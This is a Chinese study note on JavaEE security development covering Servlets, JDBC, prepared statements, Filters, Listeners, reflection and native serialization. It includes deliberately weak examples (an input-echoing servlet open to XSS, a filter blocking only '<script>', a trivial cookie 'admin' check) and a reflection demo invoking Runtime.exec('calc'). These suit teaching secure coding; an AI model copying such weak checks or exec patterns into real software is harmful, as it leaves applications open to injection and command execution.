---
title: JavaEE安全开发
date: 2025-08-12
categories:
  - Java基础
tags:
  - JavaEE
  - Web开发
---

# JAVA EE
# 32-Servlet路由技术&JDBC&Mybatis数据库
tomcat端口占用解决：

1、关闭占用程序：

```plain
::查看 8005 和 8080 端口的占用情况
netstat -ano | findstr "8005 8080"
::使用 tasklist 命令查看占用端口的进程名称
tasklist | findstr "PID"
::关闭占用端口的进程
taskkill /F /PID 'PID'
```

2、修改端口

```xml
D:\JavaCode\Tomcat\apache-tomcat-9.0.105\conf\server.xml

<!-- 修改 Shutdown 端口（默认 8005） -->
<Server port="8006" shutdown="SHUTDOWN">

<!-- 修改 HTTP 端口（默认 8080） -->
<Connector port="8081" protocol="HTTP/1.1" connectionTimeout="20000" redirectPort="8443" />
```





## JavaEE-HTTP-Servlet&路由&周期
### Servlet
参考：[https://blog.csdn.net/qq_52173163/article/details/121110753](https://blog.csdn.net/qq_52173163/article/details/121110753)

#### **1、解释**
Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。

#### **2、创建和使用Servlet**
1.创建一个类继承HttpServlet

```java
package com.example.demo01;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("--------doGET");
        //super.doGet(req, resp);
    }
}
```

2.web.xml配置Servlet路由

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <!-- 定义Servlet -->
    <servlet>
        <servlet-name>index</servlet-name>

        <!-- 指定Servlet类的完整路径 -->
        <servlet-class>com.example.demo1.IndexServlet</servlet-class>

    </servlet>

    <!-- 配置Servlet映射 -->
    <servlet-mapping>
        <servlet-name>index</servlet-name>

        <!-- 指定Servlet的URL映射 -->
        <url-pattern>/index</url-pattern>

    </servlet-mapping>

</web-app>

```

3.WebServlet配置Servlet路由

4.写入内置方法(init service destroy doget dopost)

```java
package com.example.demo1;

import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.ServletConfig;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

// 使用@WebServlet注解将Servlet映射到特定的URL
@WebServlet("/a")
public class IndexServlet extends HttpServlet {

    // 处理GET请求的方法
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("--------------doGet");

        // 从请求中获取参数"id"
        String id = req.getParameter("id");

        // 设置响应的内容类型
        resp.setContentType("text/html; charset=GBK");

        // 获取PrintWriter以将HTML响应发送给客户端
        PrintWriter out = resp.getWriter();

        // 输出从GET请求中收到的数据
        out.println("这是GET请求的数据:");
        out.println("id：" + id + "<br>");
        out.flush();
        out.close();
    }

    // 处理POST请求的方法
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        // 从请求中获取参数"name"
        String name = req.getParameter("name");

        // 设置响应的内容类型
        resp.setContentType("text/html; charset=GBK");

        // 获取PrintWriter以将HTML响应发送给客户端
        PrintWriter out = resp.getWriter();

        // 输出从POST请求中收到的数据
        out.println("这是post提交的数据");
        out.println(name);
        out.flush();
        out.close();

        System.out.println("--------------doPost");
    }

    // 当Servlet首次创建时调用的初始化方法
    @Override
    public void init(ServletConfig config) throws ServletException {
        System.out.println("--------------init");

        // 可以在这里添加任何初始化任务的代码
    }

    // 当Servlet被销毁时调用的方法
    @Override
    public void destroy() {
        System.out.println("--------------destroy");
        super.destroy();
    }

    // 处理GET和POST请求的服务方法
    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("--------------http service");
        super.service(req, resp);
    }

    // 覆盖的用于ServletRequest和ServletResponse的服务方法
    @Override
    public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
        System.out.println("--------------Servlet service");
        super.service(req, res);
    }
}

```



简单使用doPost

```java
@Override
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    // 从请求参数中获取名字数据
    String name = req.getParameter("name");
    
    // 设置请求编码为UTF-8，以确保正确解析中文字符
    req.setCharacterEncoding("UTF-8");
    
    // 设置响应内容类型为text/html
    resp.setContentType("text/html");
    
    // 获取PrintWriter对象，用于向客户端发送响应数据
    PrintWriter out = resp.getWriter();
    
    // 向客户端发送提示信息，表示这是通过POST提交的数据
    out.println("这是post提交的数据");
    
    // 向客户端发送从请求参数中获取的名字数据
    out.println(name);
    
    // 在服务器端打印名字数据到控制台
    System.out.println(name);
    
    // 刷新输出缓冲区，确保数据被及时发送到客户端
    out.flush();
    
    // 关闭PrintWriter，释放资源
    out.close();
    
    // 在服务器端打印信息，表示doPost方法执行完成
    System.out.println("--------------doPost");
}

```



#### **3、Servlet生命周期**
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859477.png)

#### **4、处理接受和回显**
+ HttpServletRequest（HTTP请求的信息）
+ ServletRequest的子接口：**HttpServletRequest是ServletRequest**接口的子接口，提供了用于处理HTTP请求的额外功能。
+ getParameter(name)：通过参数名获取请求中的值。返回一个**String**，表示与给定参数名相对应的单个值。
+ getParameterValues(name)：通过参数名获取请求中的多个值。返回一个**String[]**，表示与给定参数名相对应的多个值。
+ HttpServletResponse（HTTP响应的信息）
+ ServletResponse的子接口：**HttpServletResponse是ServletResponse**接口的子接口，提供了用于处理HTTP响应的额外功能。
+ setCharacterEncoding()：设置响应的字符编码格式。通常用于确保正确的文本输出。
+ setContentType()：设置响应内容的类型和编码。常用于指定输出的数据类型，如HTML、JSON等。
+ getWriter()：获取一个**PrintWriter**字符输出流，用于向客户端发送文本数据。
+ PrintWriter：**PrintWriter**是用于向客户端输出字符数据的类，可以接受各种数据类型，然后将其转换为文本并发送到客户端。

## 数据库-JDBC&Mybatis&库
-原生态数据库开发：JDBC  
参考：[https://www.jianshu.com/p/ed1a59750127](https://www.jianshu.com/p/ed1a59750127)  
JDBC(Java Database connectivity): 由java提供,用于访问数据库的统一API接口规范.数据库驱动: 由各个数据库厂商提供,用于访问数据库的jar包(JDBC的具体实现),遵循JDBC接口,以便java程序员使用！

### 1、下载jar
[https://mvnrepository.com/](https://mvnrepository.com/)

### 2、引用封装jar
创建lib目录，复制导入后，添加为库

### 3、注册数据库驱动
“com.mysql.jdbc.Driver”： 这是 MySQL JDBC 驱动程序的类名。JDBC是 Java 用于与数据库交互的 API，而不同的数据库供应商提供了各自的 JDBC 驱动程序。在这里，"com.mysql.jdbc.Driver" 是 MySQL JDBC 驱动程序的类名。

加载和初始化： 当调用 Class.forName("com.mysql.jdbc.Driver"); 时，它会尝试查找、加载并初始化指定的类。在这个过程中，MySQL JDBC 驱动程序的静态代码块（static {...}）会被执行，这通常用于注册驱动程序。

在旧版本的 MySQL 驱动中，com.mysql.jdbc.Driver 是驱动类的完整路径。  
在新版本中，com.mysql.cj.jdbc.Driver 是 MySQL Connector/J 的驱动类。

```java
Class.forName("com.mysql.jdbc.Driver");
```

### 4、建立数据库连接
```java
// 定义数据库连接的URL，格式为：jdbc:mysql://host:port/database
String url = "jdbc:mysql://localhost:3306/dome01";
// 使用DriverManager获取数据库连接
Connection connection = DriverManager.getConnection(url, "root", "root");
// 打印数据库连接信息
System.out.println(connection);
```

### 5、创建Statement执行SQL
connection.createStatement();： 在Connection对象上调用createStatement方法，创建一个Statement对象。Statement对象用于执行SQL语句，它可以执行静态的SQL查询、更新、删除等操作。createStatement方法返回一个新的Statement对象。  
创建一个Statement对象，然后使用该对象执行给定的SQL查询语句，将查询结果存储在一个ResultSet对象中。这样，您可以通过遍历ResultSet来检索和处理查询的结果集中的数据。

```java
// 创建Statement对象
Statement statement= connection.createStatement();
String sql="select * from news";
// 执行查询，获取结果集
ResultSet resultSet = statement.executeQuery(sql);

```

### 6、结果ResultSet进行提取
```java
// 遍历结果集
while (resultSet.next()) {
    // 从结果集中获取每一行的数据
    // 获取整型列 "id"
    int id = resultSet.getInt("id");
    // 获取字符串列 "page_title"
    String page_title = resultSet.getString("page_title");
    String heading = resultSet.getString("heading");
    String subheading = resultSet.getString("subheading");
    String content = resultSet.getString("content");
    String img = resultSet.getString("img");
    // 输出每一行的数据，以便查看结果
    System.out.println(id + "|" + page_title + "|" + heading + "|" + subheading + "|" + content + "|" + img);
}

```



# 33-SQL预编译&Filter过滤器&Listener监听器
## 预编译-SQL原理：
原理：**提前编译好执行逻辑，你注入的语句不会改变原有逻辑！**

```java
// 预编译写法:safesql 是一个预编译的 SQL 查询语句，其中 ? 是一个占位符，表示将在执行时动态替换。
String safesql = "SELECT * FROM news WHERE id=?";

// 使用PreparedStatement:PreparedStatement 是 Statement 的子接口，用于执行预编译的 SQL 语句。通过调用 connection.prepareStatement(safesql) 创建一个 PreparedStatement 对象。
try (PreparedStatement preparedStatement = connection.prepareStatement(safesql)) {
    
    // 设置参数，防止SQL注入攻击,使用 setXXX 方法设置占位符的值。在这里，使用 setInt(1, id) 将 id 的值设置到第一个占位符上。这种方式防止了 SQL 注入攻击，因为参数值是通过预编译的方式传递的，而不是通过直接拼接字符串。
    preparedStatement.setInt(1, id);

    // 执行查询,调用 executeQuery() 执行查询，得到 ResultSet 对象。
ResultSet resultSet = preparedStatement.executeQuery();

    // 处理结果集,根据业务需要，处理查询结果集的数据
    } catch (SQLException e) {
    e.printStackTrace();
}
```







## 过滤器-Filter
Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902142.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901515.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901152.png)



#### 创建过滤器
#### 1、创建过滤器之前的准备
创建新的项目FilterDemo1  
在对应的包名上，创建分类包filter与servlet  
在servlet下创建TestServlet ，并进行检测  
启动服务器，尝试进行Xss攻击，发现可以

```java
//TestServlet

@Override
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    // 从请求中获取名为 "code" 的参数值
    String code = req.getParameter("code");

    // 获取用于将输出发送回客户端的 PrintWriter 对象
    PrintWriter out = resp.getWriter();

    // 将 "code" 参数的值打印到客户端
    out.println(code);

    // 刷新 PrintWriter，确保立即发送任何缓冲的内容
    out.flush();

    // 关闭 PrintWriter 以释放资源
    out.close();
}

```

#### 2、创建过滤器
#### 3、过滤器内置方法
在对应的filter下创建XssFilter并实现Filter 接口中的所有方法

```java
//XssFilter

@WebFilter("/test")
public class XssFilter implements Filter {

    @Override
    // 中间件启动后就自动运行
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("xss开启过滤");
    }

    @Override
    // 中间件关闭后就自动运行
    public void destroy() {
        System.out.println("xss销毁过滤");
    }

    @Override
    // doFilter 访问路由触发的方法
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("xss正在过滤");

        // 过滤代码就应该在放行前
        // 如果符合就放行，不符合就过滤（拦截）

        // XSS过滤 接受参数值 如果有攻击payload 就进行拦截
        // 接受参数值 如果没有攻击payload 就进行放行
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        String code = request.getParameter("code");

        if (!code.contains("<script>")) { // 没有攻击payload
            // 放行
            filterChain.doFilter(servletRequest, servletResponse);
        } else {
            System.out.println("存在XSS攻击");
            // 继续拦截
            // 这里可以根据需要添加拦截后的处理逻辑，例如记录日志、返回错误信息等
        }
    }
}

```

#### 4、过滤器触发流程
```java
@WebFilter("/test")
<filter>
<filter-name>xssFilter</filter-name>

<filter-class>com.example.filter.xssFilter</filter-class>

</filter>

<filter-mapping>
<filter-name>xssFilter</filter-name>

<url-pattern>/test</url-pattern>

</filter-mapping>

```

#### 5、利用过滤器简单实现：cookie身份验证
在servlet下创建AdminServlet，

```java
@WebServlet("/admin")
public class AdminServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("欢迎进入管理员页面");
    }
}
```

+ 在filter下创建AdminFileter
+ 先不加入判断获取到浏览器本身的cookie值

```java
@WebFilter("/admin")
public class AdminFileter implements Filter{
    @Override
    // 过滤器初始化方法，在应用启动时执行
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("admin身份检测开启");
    }

    @Override
    // 过滤器销毁方法，在应用关闭时执行
    public void destroy() {
        System.out.println("admin身份检测销毁");
    }

    @Override
    // 过滤器核心逻辑，处理请求和响应
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        System.out.println("admin身份检测进行");

        // 检测Cookie过滤
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        Cookie[] cookies = request.getCookies();

        // 对Cookie进行遍历获取
        for (Cookie c : cookies) {
            String cName = c.getName();    // 获取cookie名
            String cValue = c.getValue();  // 获取cookie值
            System.out.println(cName);
            System.out.println(cValue);

            filterChain.doFilter(servletRequest, servletResponse);
        }
    }
}

```

+ 检查请求中是否包含**名为 “user” 且值为 “admin”** 的Cookie。如果符合条件，则放行请求；否则，输出 “非管理员访问”。
+ 相应进入管理员页面，必须先在浏览器中添加对应判断的cookie值
+ 如果对应不上则是非管理员访问，不予通过

```java
@Override
    // 过滤器核心逻辑，处理请求和响应
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {

        System.out.println("admin身份检测进行");

        // 检测Cookie过滤
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        Cookie[] cookies = request.getCookies();

        // 对Cookie进行遍历获取
        for (Cookie c : cookies) {
            String cName = c.getName();    // 获取cookie名
            String cValue = c.getValue();  // 获取cookie值
            System.out.println(cName);
            System.out.println(cValue);

            // 检查是否包含名为 "user" 且值为 "admin" 的Cookie
            if (cName.contains("user") && cValue.contains("admin")) {
                // 是管理员，放行请求
                                    filterChain.doFilter(servletRequest, servletResponse);

            } else {
                System.out.println("非管理员访问");
                // 非管理员，可以根据需求添加相应的处理逻辑，例如重定向到登录页等
            }

        }
    }

```

#### 6、过滤器安全场景
开启过滤后，发现成功拦截Xss攻击

Payload检测，权限访问控制，红队内存马植入，蓝队清理内存马等





## 监听器-Listen
参考：[https://blog.csdn.net/qq_52797170/article/details/124023760](https://blog.csdn.net/qq_52797170/article/details/124023760)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859569.png)





监听ServletContext、HttpSession、ServletRequest等域对象创建和销毁事件  
监听域对象的属性发生修改的事件  
监听在事件发生前、发生后做一些必要的处理



### 1、创建监听器
创建新的项目ListenDemo1

在对应的包名上，创建分类包listenerr与servlet

在servlet下创建CSession DSession，并进行检测

DSession一个简单的Servlet，对应一个/ds的URL映射。在收到GET请求时，它会销毁当前请求的HttpSession。

```java
@WebServlet("/ds")
public class DSession extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("Servlet里面销毁Session");

        // 销毁Session
        req.getSession().invalidate();
    }
}
```

@WebServlet("/ds"): 通过此注解，指定了Servlet的URL映射为 “/ds”。  
System.out.println("Servlet里面销毁Session");: 打印一条日志，说明Servlet正在销毁Session。  
req.getSession().invalidate();: 获取当前请求的HttpSession，并调用invalidate()方法使其失效，从而销毁Session。这通常会导致用户在当前会话中的状态丢失，因为Session被销毁了。  
这段代码是一个简单的Servlet，对应一个 /cs 的URL映射。在收到GET请求时，它会创建一个新的HttpSession。





```java
@WebServlet("/cs")
public class CSession extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("Servlet里面创建Session");

        // 创建Session
        req.getSession();
    }
}
```

@WebServlet("/cs"): 通过此注解，指定了Servlet的URL映射为 “/cs”  
System.out.println("Servlet里面创建Session");: 打印一条日志，说明Servlet正在创建Session。  
req.getSession();: 获取当前请求的HttpSession，如果不存在**则会创建一个新的Session。**这通常会在应用程序需要使用会话状态时调用。



### 2、监听器内置方法
这段代码定义了一个实现 HttpSessionListener 接口的监听器类 ListenSession，用于监听HttpSession的创建和销毁事件。



```java
@WebListener
public class ListenSession implements HttpSessionListener {

    @Override
    public void sessionCreated(HttpSessionEvent se) {
        // 监听检测有Session创建就会执行这里
        System.out.println("监听器监听到了session创建");
    }

    @Override
    public void sessionDestroyed(HttpSessionEvent se) {
        // 监听检测有Session销毁就会执行这里
        System.out.println("监听器监听到了session销毁");
    }
}
```

@WebListener: 通过此注解，标记这是一个监听器类。  
@Override 注解用于表示下面的方法是对接口中方法的重写。  
public void sessionCreated(HttpSessionEvent se): 当有新的 HttpSession 被创建时，这个方法会被调用。在这里，它简单地输出一条日志表示监听器检测到了session的创建。  
public void sessionDestroyed(HttpSessionEvent se): 当一个 HttpSession 被销毁时，这个方法会被调用。在这里，它简单地输出一条日志表示监听器检测到了session的销毁。



### 3、监听器触发流程
在Java Web应用中，监听器用于监控和响应特定的事件。对于监听器的触发流程，以下是一般的步骤：

```plain
@WebListener
<listener>
.......
</listener>

```

注册监听器：  
在Web应用中，你需要将监听器注册到相应的组件上。例如，在web.xml文件中配置监听器，或者使用注解（如@WebListener）标记监听器类。  
事件发生：  
当与监听器关联的特定事件在Web应用中发生时，监听器会被触发。  
调用监听器方法：  
监听器类中实现的相应方法（如sessionCreated、sessionDestroyed等）将被调用。这些方法包含与事件相关的信息，允许监听器执行特定的逻辑。  
执行自定义逻辑：  
在监听器方法中，你可以编写自定义的逻辑以响应事件。这可能包括记录日志、修改数据、发送通知等。  
举例来说，对于HttpSessionListener：

当一个新的HttpSession被创建时，sessionCreated方法将被调用。  
当一个HttpSession被销毁时，sessionDestroyed方法将被调用。  
总的来说，监听器提供了一种在Web应用中对特定事件进行响应的机制，使开发者能够以声明性的方式处理应用的生命周期事件。

### 4、监听器安全场景
代码审计中分析执行逻辑触发操作，红队内存马植入，蓝队清理内存马等









# 34-反射机制
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902693.png)











## Java-反射-概念
1、什么是Java反射  
参考：[https://xz.aliyun.com/t/9117](https://xz.aliyun.com/t/9117)  
Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。该类库包含了Field、Method、Constructor等类。

**反射机制：对成员变量，成员方法和构造方法的信息进行的编程操作。**

2、为什么要用到反射  
参考：[https://xz.aliyun.com/t/9117](https://xz.aliyun.com/t/9117)

**动态**的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。**划重点：在运行时而不是编译时。**

.java	-->	.class

3、反射机制应用  
开发应用场景：  
Spring框架的IOC基于反射创建对象和设置依赖属性。  
SpringMVC的请求调用对应方法，也是通过反射。  
JDBC的Class#forName(String className)方法，也是使用反射。

安全应用场景：  
构造利用链，触发命令执行  
反序列化中的利用链构造  
动态获取或执行任意类中的属性或方法  
动态代理的底层原理是反射技术  
rmi反序列化也涉及到反射操作



## 类对象
#### Class对象类获取
```java
//User.java

public class User {
    //成员变量
    public String name="xiaodi";
    public int age = 31;
    private String gender="man";
    protected String job="sec";

    //构造方法
    public User(){
        //System.out.println("无参数");
    }

    public User(String name){
        System.out.println("我的名字"+name);
    }

    private User(String name,int age){
        System.out.println(name);
        System.out.println(age);
    }

    //成员方法
    public void userinfo(String name,int age,String gender,String job){
        this.job=job;
        this.age=age;
        this.name = name;
        this.gender=gender;
    }

    protected void users(String name,String gender){
        this.name = name;
        this.gender=gender;
        System.out.println("users成员方法："+name);
        System.out.println("users成员方法："+gender);
    }

}

```



 类获取方法：

```java
//GetClass.java

package com.example.reflectdemo1;

public class GetClass {
    public static void main(String[] args) throws ClassNotFoundException {
        //1、根据全限定类名：Class.forName(“全路径类名”)
        Class aClass = Class.forName("com.example.reflectdemo1.User");
        System.out.println(aClass);

        //2、根据类名：类名.class
        Class userClass = User.class;
        System.out.println(userClass);

        //3、根据对象：对象.getClass()
        User user = new User();
        Class aClass1 = user.getClass();
        System.out.println(aClass1);

        //4、通过类加载器获得Class对象：
        //ClassLoader.getSystemClassLoader().loadClass("全路径类名");
        ClassLoader clsload=ClassLoader.getSystemClassLoader();
        Class aClass2 = clsload.loadClass("com.example.reflectdemo1.User");
        System.out.println(aClass2);
    }

}
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901924.png)



#### Field成员变量类获取
```java
//GetFiled.java

package com.example.reflectdemo1;

import java.lang.reflect.Field;

public class GetFiled {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Class aClass = Class.forName("com.example.reflectdemo1.User");

        //1.获取公共的成员变量
        Field[] fields = aClass.getFields();    	
        for(Field fd:fields){
            System.out.println(fd);
        }

        //2.获取所有的成员变量
        Field[] fields = aClass.getDeclaredFields();
        for(Field fd:fields){
            System.out.println(fd);
        }

        //3.获取单个的公共成员变量
        Field name = aClass.getField("name");
        System.out.println(name);

        //4.获取单个的成员变量
        Field gender = aClass.getDeclaredField("gender");
        System.out.println(gender);

        //5.获取公共的成员变量age的值
        User u = new User();
        Field field=aClass.getField("age");
        //取值
        Object a=field.get(u);
        System.out.println(a);
        //赋值
        field.set(u,32);
        Object aa=field.get(u);
        System.out.println(aa);
    }
}
```





#### Constructor构造方法类获取
```java
//GetConstructor.java

package com.example.reflectdemo1;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

public class GetConstructor {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
        Class aClass = Class.forName("com.example.reflectdemo1.User");

        //1.获取公共的构造方法
        Constructor[] constructors = aClass.getConstructors();
        for(Constructor c:constructors){
            System.out.println(c);
        }

        //2.获取所有的构造方法
        Constructor[] constructors = aClass.getDeclaredConstructors();
        for(Constructor c:constructors){
            System.out.println(c);
        }

        //3.获取单个的公共构造方法
        Constructor constructor = aClass.getConstructor(String.class);
        System.out.println(constructor);

        //4.获取单个的构造方法
        Constructor con3 = aClass.getDeclaredConstructor(String.class, int.class);
        System.out.println(con3);

        //获取类中声明的具有两个参数（String和int）的构造方法
        Constructor con4 = aClass.getDeclaredConstructor(String.class, int.class);
        //临时开启对私有构造方法的访问权限
        con4.setAccessible(true);
        //使用构造方法创建对象，传递参数 "xiaodigaygay" 和 40
        User uu = (User) con4.newInstance("xiaodisec", 40);
        System.out.println(uu);
        //获取类中声明的具有一个参数（String）的构造方法
        Constructor con2 = aClass.getConstructor(String.class);
        //使用构造方法创建对象，传递参数 "xiaodisec"
        con2.newInstance("xiaodisec");
    }
}

```





#### Method成员方法类获取
```java
//GetMethod.java

package com.example.reflectdemo1;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class GetMethod {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class aClass = Class.forName("com.example.reflectdemo1.User");

        //1.获取包括继承的公共成员方法
        Method[] methods = aClass.getMethods();
        for (Method me : methods) {
            System.out.println(me);
        }

        //2.获取不包括继承的所有成员方法
        Method[] methods1 = aClass.getDeclaredMethods();
        for(Method me:methods1){
            System.out.println(me);
        }

        //3.获取单个的成员方法
        Method users = aClass.getDeclaredMethod("users", String.class,String.class);
        System.out.println(users);

        //4.对成员方法进行执行
        // 创建 User 对象
        User u = new User();
        // 获取名为 "users" 的方法，该方法接受两个参数（String 和 String）
        Method users1 = aClass.getDeclaredMethod("users", String.class, String.class);
        // 使用反射调用 User 对象的 users 方法，传递参数 "xiaodigay" 和 "gay1"
        users1.invoke(u, "xiaodigay", "gay1");

    }
}
```







## 不安全命令执行&反序列化链构造
### 1、反射实现-命令执行
原型：java自带包含有的java.lang中有对于本机控制台的调用方法

```java
//GetRunExec.java

package com.example.reflectdemo1;

import jdk.jfr.consumer.RecordedFrame;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class GetRunExec {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException {
        //原生调用
        Runtime.getRuntime().exec("calc");

        //第三方jar

        // 使用 Class.forName 获取 java.lang.Runtime 类
        Class aClass = Class.forName("java.lang.Runtime");
        // 获取 Runtime 类的所有公共方法
        Method[] methods = aClass.getMethods();
        // 遍历所有方法并打印输出方法信息
        for (Method me : methods) {
            System.out.println(me);
        }

        
        //获取单个Runtime
        Method getRuntime = aClass.getMethod("getRuntime");
        System.out.println(getRuntime);


        // 获取名为 "exec" 的方法，该方法接受一个 String 参数
        Method exec = aClass.getMethod("exec", String.class);
        // 获取名为 "getRuntime" 的方法，该方法不接受参数
        Method getRuntimeMethod = aClass.getMethod("getRuntime");
        // 使用反射调用 aClass 对象的 getRuntime 方法，获取 Runtime 对象
        Object runtime = getRuntimeMethod.invoke(aClass);
        // 使用反射调用 Runtime 对象的 exec 方法，执行系统命令 "calc.exe"
        exec.invoke(runtime, "calc.exe");
        
        
        // 使用 Class.forName 获取 Runtime 类
        Class c1 = Class.forName("java.lang.Runtime");
        // 获取 Runtime 类的默认构造方法
        Constructor m = c1.getDeclaredConstructor();
        // 设置构造方法为可访问
        m.setAccessible(true);
        // 使用反射调用 Runtime 类的 exec 方法，执行系统命令 "calc"
        c1.getMethod("exec", String.class).invoke(m.newInstance(), "calc");
    }
}
```





### 2、不安全的反射对象
指应用程序使用具有反射功能的外部输入来选择要使用的类或代码，  
可能被攻击者利用而输入或选择不正确的类。绕过身份验证或访问控制检查  
参考分析：

# 35-原生反序列化
## Java序列化&反序列化
参考资料：

1、序列化与反序列化  
序列化：将内存中的对象压缩成字节流  
反序列化：将字节流转化成内存中的对象

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902779.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902477.png)



2、为什么有序列化技术  
序列化与反序列化的设计就是用来**传输数据**的。

应用场景  
(1) 想把内存中的对象保存到一个文件中或者是数据库当中。  
(2) 用套接字在网络上传输对象。  
(3) 通过RMI传输对象的时候。



## 原生序列化&反序列化
```java
//UserDemo.java

package com.example.seriatestdemo;

import java.io.Serializable;

public class UserDemo implements Serializable {
    private static final long serialVersionUID = 5306964442453291483L; // 显式定义 serialVersionUID

    public String name = "xiaodi";
    public String gender = "man";
    public Integer age = 18;

    public UserDemo(String name, String gender, Integer age) {
        this.name = name;
        this.gender = gender;
        System.out.println("UserDemo_" + name);
        System.out.println("UserDemo_" + gender);
        System.out.println("UserDemo_" + age);
    }

    @Override
    public String toString() {
        return "User{" +
                "name='" + name + '\'' +
                ", gender='" + gender + '\'' +
                ", age=" + age +
                '}';
    }
}
```

```java
//SerializableDemo.java

package com.example.seriatestdemo;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

public class SerializableDemo {
    public static void main(String[] args) throws IOException {
        //创建一个对象，引用UserDemo
        UserDemo u = new UserDemo("xiaodisec", "man1", 118);
        //System.out.println(u);
        //调用方法
        SerializableTest(u);
        }

    public static void SerializableTest(Object obj) throws IOException {
        //FileOutputStream()输出文件
        //将对象obj序列化后输出到文件ser.txt
        //ser.txt 就是对象 u 序列化的数据
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.txt"));
        oos.writeObject(obj);
    }
}
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859659.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300859696.png)



```java
//UnserializableDemo.java

package com.example.seriatestdemo;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;

public class UnserializableDemo {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        //调用下面方法，传输ser.txt 解析还原反序列化
        Object obj =unserializableTest("ser.txt");
        System.out.println(obj);
    }

    public static Object unserializableTest(String filename) throws IOException, ClassNotFoundException {
        //读取Filename文件进行反序列化还原
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(filename)));
        return ois.readObject();
    }
}
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901944.png)



